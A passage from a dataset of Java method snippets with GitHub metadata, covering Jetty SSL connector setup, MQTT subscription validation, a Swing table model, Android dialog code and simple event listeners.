{"extends": null, "implements": ["Provider"], "modifiers": ["public"]}}, {"id": 31907, "method_name": "setJettySettings", "class_name": "WebServerProvider", "params": ["ServerConnector"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setJettySettings(ServerConnector connector) {\n    int acceptQueueSize = this.props.getInt(\"jetty.acceptQueueSize\", 100);\n    connector.setAcceptQueueSize(acceptQueueSize);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebServerProvider.java", "stars": "18", "class_props": {"extends": null, "implements": ["Provider"], "modifiers": ["public"]}}, {"id": 31908, "method_name": "setHeaderBufferSize", "class_name": "WebServerProvider", "params": ["HttpConfiguration"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setHeaderBufferSize(HttpConfiguration configuration) {\n    configuration.setRequestHeaderSize(MAX_HEADER_BUFFER_SIZE);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebServerProvider.java", "stars": "18", "class_props": {"extends": null, "implements": ["Provider"], "modifiers": ["public"]}}, {"id": 31909, "method_name": "createHttpsConnector", "class_name": "WebServerProvider", "params": ["Server"], "throws": null, "modifiers": ["private"], "return_type": "ServerConnector", "snippet": "  private ServerConnector createHttpsConnector(Server jettyServer) {\n\n    SslContextFactory sslContextFactory = new SslContextFactory();\n    sslContextFactory.setKeyStorePath(this.props.getString(\"jetty.keystore\"));\n    sslContextFactory.setKeyManagerPassword(this.props.getString(\"jetty.password\"));\n    if (\"true\".equals(this.props.getString(\"jetty.has.truststore\"))) {\n      sslContextFactory.setTrustStorePath(this.props.getString(\"jetty.truststore\"));\n      sslContextFactory.setTrustStorePassword(this.props.getString(\"jetty.trustpassword\"));\n    }\n    sslContextFactory.setNeedClientAuth(true);\n\n    HttpConfiguration httpConfig = new HttpConfiguration();\n    setHeaderBufferSize(httpConfig);\n    httpConfig.addCustomizer(new SecureRequestCustomizer());\n    final int port = this.props.getInt(\"jetty.ssl.port\", Constants.DEFAULT_SSL_PORT_NUMBER);\n\n    return createServerConnector(jettyServer, port,\n        new SslConnectionFactory(sslContextFactory, \"http/1.1\"),\n        new HttpConnectionFactory(httpConfig));\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/WebServerProvider.java", "stars": "18", "class_props": {"extends": null, "implements": ["Provider"], "modifiers": ["public"]}}, {"id": 31910, "method_name": "process", "class_name": "MqttSubscribeHandler", "params": ["Channel", "MqttSubscribeMessage"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void process(Channel channel, MqttSubscribeMessage msg) {\n        SecurityUser user = NettyUtil.getUser(channel);\n        if (user == null) {\n            channel.close();\n            return;\n        }\n\n        List<MqttTopicSubscription> topicSubscriptions = msg.payload().topicSubscriptions();\n        if (this.validTopicFilter(topicSubscriptions)) {\n            List<Integer> qos = new ArrayList<>();\n            topicSubscriptions.forEach(topicSubscription -> {\n                // \u4e0d\u5141\u8bb8\u8ba2\u9605\u5176\u4ed6\u7528\u6237\u4e3b\u9898\n                String userId = topicSubscription.topicName().split(\"/\")[0];\n                if (!user.getId().equals(Integer.parseInt(userId))) {\n                    channel.close();\n                    return;\n                }\n                qos.add(topicSubscription.qualityOfService().value());\n                NettyMqttHandler.TOPICS.putIfAbsent(topicSubscription.topicName(), new DefaultChannelGroup(GlobalEventExecutor.INSTANCE));\n                NettyMqttHandler.TOPICS.get(topicSubscription.topicName()).add(channel);\n            });\n            MqttSubAckMessage subAckMessage = (MqttSubAckMessage) MqttMessageFactory.newMessage(\n                    new MqttFixedHeader(MqttMessageType.SUBACK, false, MqttQoS.AT_MOST_ONCE, false, 0),\n                    MqttMessageIdVariableHeader.from(msg.variableHeader().messageId()),\n                    new MqttSubAckPayload(qos));\n            channel.writeAndFlush(subAckMessage);\n            log.debug(\"SUBSCRIBE - clientId: {}, topFilter: {}, QoS: {}\", NettyUtil.getName(channel), topicSubscriptions, qos);\n        } else {\n            channel.close();\n        }\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/mqtt/impl/MqttSubscribeHandler.java", "stars": "6", "class_props": {"extends": null, "implements": ["MqttHandler"], "modifiers": ["public"]}}, {"id": 31911, "method_name": "validTopicFilter", "class_name": "MqttSubscribeHandler", "params": ["List<MqttTopicSubscription>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean validTopicFilter(List<MqttTopicSubscription> topicSubscriptions) {\n        for (MqttTopicSubscription topicSubscription : topicSubscriptions) {\n            String topicFilter = topicSubscription.topicName();\n            if (StrUtil.startWith(topicFilter, '#')\n                    || StrUtil.endWith(topicFilter, '/') || !StrUtil.contains(topicFilter, '/')\n                    || StrUtil.startWith(topicFilter, '+')) {\n                return false;\n            }\n            if (StrUtil.contains(topicFilter, '#')) {\n                // \u4e0d\u662f\u4ee5/#\u5b57\u7b26\u4e32\u7ed3\u5c3e\u7684\u8ba2\u9605\u6309\u975e\u6cd5\u8ba2\u9605\u5904\u7406\n                if (!StrUtil.endWith(topicFilter, \"/#\")) {\n                    return false;\n                }\n                // \u5982\u679c\u51fa\u73b0\u591a\u4e2a#\u7b26\u53f7\u7684\u8ba2\u9605\u6309\u975e\u6cd5\u8ba2\u9605\u5904\u7406\n                if (StrUtil.count(topicFilter, '#') > 1) {\n                    return false;\n                }\n            }\n            if (StrUtil.contains(topicFilter, '+')) {\n                //\u5982\u679c+\u7b26\u53f7\u548c/+\u5b57\u7b26\u4e32\u51fa\u73b0\u7684\u6b21\u6570\u4e0d\u7b49\u7684\u60c5\u51b5\u6309\u975e\u6cd5\u8ba2\u9605\u5904\u7406\n                if (StrUtil.count(topicFilter, '+') != StrUtil.count(topicFilter, \"/+\")) {\n                    return false;\n                }\n            }\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/netty/mqtt/impl/MqttSubscribeHandler.java", "stars": "6", "class_props": {"extends": null, "implements": ["MqttHandler"], "modifiers": ["public"]}}, {"id": 31912, "method_name": "getRowCount", "class_name": "JTableDemo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t       public int getRowCount()\n\t\t       {\n\t\t           //\u8fd4\u56de\u8868\u7684\u884c\u6570\uff0c\u8fd4\u56deTableData\u4e0a\u6302\u7684String\u6570\u7ec4\u4e2a\u6570\n\t\t           return TableData.size();\n\t\t    \t   \n\t\t       }", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/JTableDemo.java", "stars": "3", "class_props": {"extends": "AbstractTableModel", "implements": null, "modifiers": ["public"]}}, {"id": 31913, "method_name": "getColumnCount", "class_name": "JTableDemo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t       public int getColumnCount()\n\t\t       {\n\t\t           //\u8fd4\u56de\u8868\u7684\u5217\u6570\uff0c\u76f4\u63a5\u8fd4\u56deTableTitle.size()\n\t\t           return TableColumn.size();\n\t\t       }", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/JTableDemo.java", "stars": "3", "class_props": {"extends": "AbstractTableModel", "implements": null, "modifiers": ["public"]}}, {"id": 31914, "method_name": "getValueAt", "class_name": "JTableDemo", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "\t\t       public Object getValueAt(int rowIndex, int columnIndex)\n\t\t       {\n\t\t            \n\t\t           //\u83b7\u53d6\u76f8\u5e94\u5750\u6807\u4f4d\u7f6e\u7684\u503c\uff0c\u5206\u4e0b\u9762\u4e24\u6b65\n\t\t           //\u83b7\u53d6\u6bcf\u4e00\u884c\u5bf9\u5e94\u7684String[]\u6570\u7ec4\n\t\t           String LineTemp[] = (String[])this.TableData.get(rowIndex);\n\t\t           //\u63d0\u53d6\u51fa\u5bf9 \u5e94\u7684\u6570\u636e\n\t\t           return LineTemp[columnIndex];\n\t\t       }", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/JTableDemo.java", "stars": "3", "class_props": {"extends": "AbstractTableModel", "implements": null, "modifiers": ["public"]}}, {"id": 31915, "method_name": "isCellEditable", "class_name": "JTableDemo", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\t       public boolean isCellEditable(int rowIndex, int columnIndex)\n\t\t       {\n\t\t           //\u8fd9\u4e2a\u51fd\u6570\u5f0f\u8bbe\u7f6e\u6bcf\u4e2a\u5355\u5143\u683c\u7684\u7f16\u8f91\u5c5e\u6027\u7684\n\t\t           //\u8fd9\u4e2a\u51fd\u6570AbstractTableModel\u5df2\u7ecf\u5b9e\u73b0\n\t\t           //\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3a\u524d\u4e24\u5217\u4e3a\u5141\u8bb8\u7f16\u8f91\u72b6\u6001\n\t\t           if(rowIndex<3&&columnIndex<3){\n\t\t               return true;\n\t\t           }\n\t\t           else{\n\t\t               return false;\n\t\t           }\n\t\t       }", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/JTableDemo.java", "stars": "3", "class_props": {"extends": "AbstractTableModel", "implements": null, "modifiers": ["public"]}}, {"id": 31916, "method_name": "setValueAt", "class_name": "JTableDemo", "params": ["Object", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\t       public void setValueAt(Object aValue, int rowIndex, int columnIndex)\n\t\t       {\n\t\t           //\u5f53\u5355\u5143\u683c\u7684\u6570\u636e\u53d1\u751f\u6539\u53d8\u7684\u65f6\u5019\u8c03\u7528\u8be5\u51fd\u6570\u91cd\u8bbe\u5355\u5143\u683c\u7684\u6570\u636e\n\t\t           //\u6570\u636e\u662f\u653e\u5728TableData\u4e2d,\u4fee\u6539\u6570\u636e\u5c31\u662f\u4fee\u6539\u7684\n\t\t           //TableData\u4e2d\u7684\u6570\u636e\uff0c\u6240\u4ee5\u6211\u4eec\u4ec5\u4ec5\u5728\u6b64\u5904\u5c06TableData\u7684\u5bf9\u5e94\u6570\u636e\u4fee\u6539\u5373\u53ef              \n\t\t           ((String[])this.TableData.get(rowIndex))[columnIndex]=(String)aValue;\n\t\t           //\u7136\u540e\u8c03\u7528\u51fd\u6570fireTableCellUpdated(int row,int col);\u66f4\u65b0\u4e00\u4e0b\u8868\u683c\u5bf9\u5e94\u4f4d\u7f6e\u7684\u6570\u636e\u663e\u793a\u5373\u53ef\u5b8c\u6210\u5bf9\u8868\u683c\u7684\u6570\u636e\u4fee\u6539\uff1b\n\t\t           this.fireTableCellUpdated(rowIndex, columnIndex);\n\t\t       }", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/JTableDemo.java", "stars": "3", "class_props": {"extends": "AbstractTableModel", "implements": null, "modifiers": ["public"]}}, {"id": 31917, "method_name": "getColumnName", "class_name": "JTableDemo", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\t       public String getColumnName(int name)\n\t\t       {\n\t\t    \t   //\u4e0d\u52a0\u8fd9\u4e00\u4e2a\u65b9\u6cd5\u5217\u540d\u662fABC\u8bfb\u4e0d\u8fdb\u6765\n\t\t           return (String)TableColumn.get(name);\n\t\t            \n\t\t       }", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/JTableDemo.java", "stars": "3", "class_props": {"extends": "AbstractTableModel", "implements": null, "modifiers": ["public"]}}, {"id": 31918, "method_name": "main", "class_name": "JTableDemo", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\t\t    public static void main(String[] args)\n\t\t    {               \n\t\t    \tJTableDemo myModel=  new JTableDemo(); \n\t\t        JTable table = new JTable(myModel);\n\t\t        JFrame jf = new JFrame();\n\t\t        JScrollPane jsp = new JScrollPane(table);//\u5fc5\u987b\u628aJTable\u653e\u5165JScrollPane\u4e2d\uff0c\u5426\u5219\u9ed8\u8ba4\u4e0d\u663e\u793a\u5217\u6807\u9898\n\t\t        jf.getContentPane().add(jsp);\n\t\t        jf.setBounds(0, 0, 500, 500);\n\t\t        jf.setVisible(true);\n\t\t        //\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u68c0\u9a8c\u76f4\u63a5\u5728table\u7684\u76f8\u5e94\u5355\u5143\u683c\u4e0a\u4fee\u6539\u6570\u636e\u540e\uff0c\u6b64\u5355\u5143\u683c\u7684\u503c\u4f1a\u4e0d\u4f1a\u53d8\u5316\n\t\t        Scanner in = new Scanner(System.in);\n\t\t        int m=in.nextInt();\n\t\t        int n=in.nextInt();\n\t\t        String a=(String)myModel.getValueAt(m,n);\n\t\t        System.out.println(a);\n\t\t    }", "url": "https://raw.githubusercontent.com/tianyu-zou/transport-log/master/JTableDemo.java", "stars": "3", "class_props": {"extends": "AbstractTableModel", "implements": null, "modifiers": ["public"]}}, {"id": 31919, "method_name": "getTiming", "class_name": "UpdateEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "EventTiming", "snippet": "    public EventTiming getTiming() {\n        return this.timing;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/events/UpdateEvent.java", "stars": "12", "class_props": {"extends": "Event", "implements": null, "modifiers": ["public"]}}, {"id": 31920, "method_name": "getLocation", "class_name": "UpdateEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Location", "snippet": "    public Location getLocation() {\n        return this.location;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/events/UpdateEvent.java", "stars": "12", "class_props": {"extends": "Event", "implements": null, "modifiers": ["public"]}}, {"id": 31921, "method_name": "getRotation", "class_name": "UpdateEvent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Rotation", "snippet": "    public Rotation getRotation() {\n        return this.rotation;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/events/UpdateEvent.java", "stars": "12", "class_props": {"extends": "Event", "implements": null, "modifiers": ["public"]}}, {"id": 31922, "method_name": "setLocation", "class_name": "UpdateEvent", "params": ["Location"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLocation(Location location) {\n        this.location = location;\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/events/UpdateEvent.java", "stars": "12", "class_props": {"extends": "Event", "implements": null, "modifiers": ["public"]}}, {"id": 31923, "method_name": "getEditMessage", "class_name": "CustomInputDialog", "params": [], "throws": null, "modifiers": ["public"], "return_type": "EditText", "snippet": "    public EditText getEditMessage() {\n        return editMessage;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31924, "method_name": "setEditMessage", "class_name": "CustomInputDialog", "params": ["EditText"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEditMessage(EditText editMessage) {\n        this.editMessage = editMessage;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31925, "method_name": "onCreate", "class_name": "CustomInputDialog", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        init();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31926, "method_name": "init", "class_name": "CustomInputDialog", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        LayoutInflater inflater = LayoutInflater.from(context);\n        View view = inflater.inflate(R.layout.layout_custom_dialog, null);\n        setContentView(view);\n        txtTitle = (TextView) view.findViewById(R.id.dialog_input_title);\n        editMessage = (EditText) view.findViewById(R.id.dialog_input_dialog_edit);\n        btnPostive = (TextView) view.findViewById(R.id.dialog_input_dialog_postive);\n        btnNegative = (TextView) view.findViewById(R.id.dialog_input_dialog_negative);\n        cacheCheck = (CheckBox) view.findViewById(R.id.dialog_input_check);\n\n        cacheCheck.setChecked(cache);\n\n        if (postiveButtonVisiable) {\n            btnPostive.setVisibility(View.VISIBLE);\n        } else {\n            btnPostive.setVisibility(View.GONE);\n        }\n        if (negativeButtonVisiable) {\n            btnNegative.setVisibility(View.VISIBLE);\n        } else {\n            btnNegative.setVisibility(View.GONE);\n        }\n\n        if (TextUtils.isEmpty(title)) {\n            txtTitle.setVisibility(View.GONE);\n        } else {\n            txtTitle.setVisibility(View.VISIBLE);\n            txtTitle.setText(title);\n        }\n        editMessage.setText(input);\n        if (input != null) {\n            editMessage.setSelection(input.length());\n        }\n        if (!TextUtils.isEmpty(hintInput)) {\n            editMessage.setHint(hintInput);\n        }\n        btnPostive.setText(postiveText);\n        btnNegative.setText(negativeText);\n        btnPostive.setOnClickListener(new OnButtonClickListener());\n        btnNegative.setOnClickListener(new OnButtonClickListener());\n        InputFilter[] filters = {new InputFilter.LengthFilter(maxLength)};\n        editMessage.setFilters(filters);\n        Window dialogWindow = getWindow();\n        WindowManager.LayoutParams lp = dialogWindow.getAttributes();\n        DisplayMetrics d = context.getResources().getDisplayMetrics(); // \u83b7\u53d6\u5c4f\u5e55\u5bbd\u3001\u9ad8\u7528\n        lp.width = (int) (d.widthPixels * 0.8); // \u5bbd\u5ea6\u8bbe\u7f6e\u4e3a\u5c4f\u5e55\u76840.8\n        dialogWindow.setAttributes(lp);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31927, "method_name": "setInput", "class_name": "CustomInputDialog", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setInput(int msgId) {\n        input = context.getString(msgId);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31928, "method_name": "setInput", "class_name": "CustomInputDialog", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setInput(String msg) {\n        input = msg;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31929, "method_name": "setHintInput", "class_name": "CustomInputDialog", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHintInput(String msg) {\n        hintInput = msg;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31930, "method_name": "setTitle", "class_name": "CustomInputDialog", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(int msgId) {\n        title = context.getString(msgId);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31931, "method_name": "setTitle", "class_name": "CustomInputDialog", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String msg) {\n        title = msg;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31932, "method_name": "setCache", "class_name": "CustomInputDialog", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCache(boolean cache) {\n        this.cache = cache;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31933, "method_name": "setNeedDismissOnClick", "class_name": "CustomInputDialog", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNeedDismissOnClick(boolean needDismissOnClick) {\n        this.needDismissOnClick = needDismissOnClick;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31934, "method_name": "setButton", "class_name": "CustomInputDialog", "params": ["int", "String", "OnClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setButton(int which, String text, OnClickListener onClickListener) {\n        switch (which) {\n            case DialogInterface.BUTTON_POSITIVE:\n                postiveButtonVisiable = true;\n                postiveText = text;\n                setOnPostiveClickListener(onClickListener);\n                break;\n            case DialogInterface.BUTTON_NEGATIVE:\n                negativeButtonVisiable = true;\n                negativeText = text;\n                setOnNegativeClickListener(onClickListener);\n                break;\n            default:\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31935, "method_name": "setOnPostiveClickListener", "class_name": "CustomInputDialog", "params": ["OnClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnPostiveClickListener(OnClickListener onPostiveClickListener) {\n        this.onPostiveClickListener = onPostiveClickListener;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31936, "method_name": "setOnNegativeClickListener", "class_name": "CustomInputDialog", "params": ["OnClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnNegativeClickListener(OnClickListener onNegativeClickListener) {\n        this.onNegativeClickListener = onNegativeClickListener;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31937, "method_name": "collapseSoftInputMethod", "class_name": "CustomInputDialog", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void collapseSoftInputMethod() {\n        InputMethodManager imm = (InputMethodManager) getContext().getSystemService(getContext().INPUT_METHOD_SERVICE);\n        if (imm != null) {\n            imm.hideSoftInputFromWindow(getCurrentFocus()\n                    .getWindowToken(), InputMethodManager.HIDE_NOT_ALWAYS);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31938, "method_name": "dismiss", "class_name": "CustomInputDialog", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dismiss() {\n        collapseSoftInputMethod();\n        super.dismiss();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31939, "method_name": "setMaxLength", "class_name": "CustomInputDialog", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMaxLength(int maxLength) {\n        this.maxLength = maxLength;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": "Dialog", "implements": null, "modifiers": ["public"]}}, {"id": 31940, "method_name": "onClick", "class_name": "OnButtonClickListener", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(View v) {\n\n            if (R.id.dialog_input_dialog_postive == v.getId()) {\n                if (onPostiveClickListener != null) {\n                    onPostiveClickListener.onClick(CustomInputDialog.this, DialogInterface.BUTTON_POSITIVE);\n                    String newInput = editMessage.getText().toString();\n                    if (!newInput.equals(input)) {\n                        input = newInput;\n                        onPostiveClickListener.onInputChanged(input, cacheCheck.isChecked());\n                    }\n                }\n            } else if (R.id.dialog_input_dialog_negative == v.getId()) {\n                if (onNegativeClickListener != null) {\n                    onNegativeClickListener.onClick(CustomInputDialog.this, DialogInterface.BUTTON_NEGATIVE);\n                }\n            }\n            if (needDismissOnClick) {\n                dismiss();\n            }\n        }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/view/CustomInputDialog.java", "stars": "2", "class_props": {"extends": null, "implements": ["View"], "modifiers": ["private"]}}, {"id": 31941, "method_name": "onServerAddedEvent", "class_name": "EventListener", "params": ["ServerAddedEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onServerAddedEvent(ServerAddedEvent event) {\n        System.out.println(\"The server will be added\");\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/EventListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEventListener"], "modifiers": ["public"]}}, {"id": 31942, "method_name": "onServerRemovedEvent", "class_name": "EventListener", "params": ["ServerRemovedEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onServerRemovedEvent(ServerRemovedEvent event) {\n        System.out.println(\"The server will be removed\");\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/EventListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEventListener"], "modifiers": ["public"]}}, {"id": 31943, "method_name": "onConnectionAddedEvent", "class_name": "EventListener", "params": ["ConnectionAddedEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onConnectionAddedEvent(ConnectionAddedEvent event) {\n        System.out.println(\"The connection will be added\");\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/EventListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEventListener"], "modifiers": ["public"]}}, {"id": 31944, "method_name": "onConnectionRemovedEvent", "class_name": "EventListener", "params": ["ConnectionRemovedEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onConnectionRemovedEvent(ConnectionRemovedEvent event) {\n        System.out.println(\"The connection will be removed\");\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/EventListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEventListener"], "modifiers": ["public"]}}, {"id": 31945, "method_name": "onMessageConfigurationEvent", "class_name": "EventListener", "params": ["MessageConfigurationEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onMessageConfigurationEvent(MessageConfigurationEvent event) {\n        System.out.println(\"A configuration was registered\");\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/EventListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEventListener"], "modifiers": ["public"]}}, {"id": 31946, "method_name": "onMessageListenerEvent", "class_name": "EventListener", "params": ["MessageListenerEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onMessageListenerEvent(MessageListenerEvent event) {\n        System.out.println(\"A listener was registered\");\n    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/EventListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEventListener"], "modifiers": ["public"]}}, {"id": 31947, "method_name": "clone", "class_name": "BorderSubstring", "params": ["Substring"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void clone(Substring other) {\n\t\tsuper.clone(other);\n\t\tint i;\n\t\tBorderSubstring bs = (BorderSubstring)other;\n\t\tbs.leftContext=leftContext;\n\t\tbs.isLeftExtensionOfMaximalRepeat=isLeftExtensionOfMaximalRepeat;\n\t\tbs.nRight=nRight;\n\t\tSystem.arraycopy(rightCharacters,0,bs.rightCharacters,0,nRight);\n\t\tSystem.arraycopy(rightLengths,0,bs.rightLengths,0,nRight);\n\t\tbs.nLeft=nLeft;\n\t\tSystem.arraycopy(leftCharacters,0,bs.leftCharacters,0,nLeft);\n\t\tSystem.arraycopy(leftLengths,0,bs.leftLengths,0,nLeft);\n\t\tbs.longestBorderLength=longestBorderLength;\n\t\tbs.shortestPeriodLength=shortestPeriodLength;\n\t\tbs.maxPossibleOccurrences=maxPossibleOccurrences;\n\t\tbs.longestBorderRightCharacter=longestBorderRightCharacter;\n\t\tbs.longestBorderLeftCharacter=longestBorderLeftCharacter;\n\t}", "url": 